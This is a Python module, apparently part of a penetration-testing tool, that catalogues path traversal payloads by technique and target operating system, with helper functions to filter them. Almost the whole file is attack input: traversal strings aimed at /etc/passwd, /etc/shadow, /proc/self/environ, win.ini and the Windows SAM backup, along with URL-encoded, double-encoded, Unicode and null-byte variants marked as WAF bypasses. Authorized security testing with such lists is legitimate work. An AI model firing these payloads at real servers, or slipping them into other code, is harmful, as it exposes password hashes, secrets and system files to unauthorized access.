"""
Path Traversal Payloads - OS-specific path traversal payloads with WAF bypass variants.

Provides payloads categorized by traversal technique and target OS.
For use in authorized penetration testing tools only.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import List, Optional


@dataclass
class PathTraversalPayload:
    """A single path traversal payload."""
    payload: str
    technique: str          # basic, encoding_bypass, null_byte, os_specific
    target_os: str          # linux, windows, generic
    description: str
    waf_bypass: bool = False
    risk_indicator: str = "path_traversal"


# ---------------------------------------------------------------------------
# Techniques and target OS values
# ---------------------------------------------------------------------------

ALL_TECHNIQUES = ["basic", "encoding_bypass", "null_byte", "os_specific"]
ALL_TARGET_OS = ["linux", "windows", "generic"]


# ---------------------------------------------------------------------------
# Basic payloads
# ---------------------------------------------------------------------------

_BASIC_PAYLOADS = [
    PathTraversalPayload(
        "../../../etc/passwd", "basic", "linux",
        "Linux passwd file with 3-level traversal",
    ),
    PathTraversalPayload(
        "..\\..\\..\\windows\\win.ini", "basic", "windows",
        "Windows win.ini with 3-level backslash traversal",
    ),
    PathTraversalPayload(
        "../../../../etc/passwd", "basic", "linux",
        "Linux passwd file with 4-level traversal",
    ),
    PathTraversalPayload(
        "..\\..\\..\\..\\windows\\win.ini", "basic", "windows",
        "Windows win.ini with 4-level backslash traversal",
    ),
    PathTraversalPayload(
        "../../../../../etc/passwd", "basic", "linux",
        "Linux passwd file with 5-level traversal",
    ),
    PathTraversalPayload(
        "../../../../../../etc/passwd", "basic", "linux",
        "Linux passwd file with 6-level traversal (deep root escape)",
    ),
    PathTraversalPayload(
        "....//....//....//etc/passwd", "basic", "generic",
        "Double-dot-slash with extra dot to bypass naive ../ stripping",
    ),
    PathTraversalPayload(
        "..././..././..././etc/passwd", "basic", "generic",
        "Recursive traversal to survive single-pass ../ removal",
    ),
]

# ---------------------------------------------------------------------------
# Encoding bypass payloads
# ---------------------------------------------------------------------------

_ENCODING_BYPASS_PAYLOADS = [
    PathTraversalPayload(
        "%2e%2e%2fetc%2fpasswd", "encoding_bypass", "linux",
        "URL-encoded ../ traversal (single encode)",
        waf_bypass=True,
    ),
    PathTraversalPayload(
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd", "encoding_bypass", "linux",
        "URL-encoded dots with literal slashes",
        waf_bypass=True,
    ),
    PathTraversalPayload(
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd", "encoding_bypass", "linux",
        "Double URL-encoded traversal (server decodes twice)",
        waf_bypass=True,
    ),
    PathTraversalPayload(
        "..%252f..%252f..%252fetc%252fpasswd", "encoding_bypass", "linux",
        "Mixed literal dots with double-encoded slashes",
        waf_bypass=True,
    ),
    PathTraversalPayload(
        "..%c0%af..%c0%af..%c0%afetc/passwd", "encoding_bypass", "linux",
        "Overlong UTF-8 encoded slash (%c0%af = /)",
        waf_bypass=True,
    ),
    PathTraversalPayload(
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd", "encoding_bypass", "linux",
        "Unicode fullwidth slash (U+FF0F) traversal",
        waf_bypass=True,
    ),
    PathTraversalPayload(
        "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini", "encoding_bypass", "windows",
        "URL-encoded backslash traversal for Windows",
        waf_bypass=True,
    ),
    PathTraversalPayload(
        "..%2f..%2f..%2fetc%2fpasswd", "encoding_bypass", "linux",
        "Mixed literal dots with encoded slashes",
        waf_bypass=True,
    ),
    PathTraversalPayload(
        "..;/..;/..;/etc/passwd", "encoding_bypass", "generic",
        "Path parameter bypass (semicolon before slash, Tomcat/Jetty)",
        waf_bypass=True,
    ),
    PathTraversalPayload(
        "..%00/..%00/..%00/etc/passwd", "encoding_bypass", "generic",
        "Null byte interleaved with traversal to confuse parsers",
        waf_bypass=True,
    ),
]

# ---------------------------------------------------------------------------
# Null byte payloads
# ---------------------------------------------------------------------------

_NULL_BYTE_PAYLOADS = [
    PathTraversalPayload(
        "../../../etc/passwd%00", "null_byte", "linux",
        "Null byte truncation after target file (bypass extension check)",
    ),
    PathTraversalPayload(
        "../../../etc/passwd%00.png", "null_byte", "linux",
        "Null byte before forced .png extension to read passwd",
    ),
    PathTraversalPayload(
        "..\\..\\..\\windows\\win.ini%00", "null_byte", "windows",
        "Null byte truncation for Windows win.ini",
    ),
    PathTraversalPayload(
        "../../../etc/passwd%00.jpg", "null_byte", "linux",
        "Null byte before forced .jpg extension bypass",
    ),
]

# ---------------------------------------------------------------------------
# OS-specific payloads
# ---------------------------------------------------------------------------

_OS_SPECIFIC_PAYLOADS = [
    # Linux-specific sensitive files
    PathTraversalPayload(
        "../../../etc/shadow", "os_specific", "linux",
        "Linux shadow file (password hashes, requires elevated access)",
    ),
    PathTraversalPayload(
        "../../../proc/self/environ", "os_specific", "linux",
        "Linux /proc/self/environ (environment variables, may leak secrets)",
    ),
    PathTraversalPayload(
        "../../../proc/self/cmdline", "os_specific", "linux",
        "Linux /proc/self/cmdline (process command line arguments)",
    ),
    PathTraversalPayload(
        "../../../etc/hosts", "os_specific", "linux",
        "Linux hosts file (network configuration)",
    ),
    # Windows-specific sensitive files
    PathTraversalPayload(
        "..\\..\\..\\boot.ini", "os_specific", "windows",
        "Windows boot.ini (legacy boot configuration)",
    ),
    PathTraversalPayload(
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "os_specific", "windows",
        "Windows hosts file via backslash traversal",
    ),
    PathTraversalPayload(
        "..\\..\\..\\windows\\system.ini", "os_specific", "windows",
        "Windows system.ini (legacy system configuration)",
    ),
    PathTraversalPayload(
        "..\\..\\..\\windows\\repair\\sam", "os_specific", "windows",
        "Windows SAM backup (Security Account Manager hashes)",
    ),
]


# ---------------------------------------------------------------------------
# All payloads combined
# ---------------------------------------------------------------------------

_ALL_PAYLOADS = {
    "basic": _BASIC_PAYLOADS,
    "encoding_bypass": _ENCODING_BYPASS_PAYLOADS,
    "null_byte": _NULL_BYTE_PAYLOADS,
    "os_specific": _OS_SPECIFIC_PAYLOADS,
}


def get_path_traversal_payloads(
    technique: Optional[str] = None,
    target_os: Optional[str] = None,
) -> List[PathTraversalPayload]:
    """Get path traversal payloads filtered by technique and/or target OS.

    Parameters
    ----------
    technique : str, optional
        Traversal technique: basic, encoding_bypass, null_byte, os_specific.
        If None, returns payloads from all techniques.
    target_os : str, optional
        Target operating system: linux, windows, generic.
        If None, returns payloads for all operating systems.

    Returns
    -------
    list of PathTraversalPayload
    """
    if technique:
        payloads = list(_ALL_PAYLOADS.get(technique, []))
    else:
        payloads = []
        for pl in _ALL_PAYLOADS.values():
            payloads.extend(pl)

    if target_os:
        payloads = [p for p in payloads if p.target_os == target_os]

    return payloads


def get_waf_bypass_payloads() -> List[PathTraversalPayload]:
    """Get only WAF bypass path traversal payloads across all techniques."""
    result: List[PathTraversalPayload] = []
    for payloads in _ALL_PAYLOADS.values():
        result.extend(p for p in payloads if p.waf_bypass)
    return result


def get_all_payloads_flat() -> List[PathTraversalPayload]:
    """Return all path traversal payloads across all techniques."""
    result: List[PathTraversalPayload] = []
    for payloads in _ALL_PAYLOADS.values():
        result.extend(payloads)
    return result
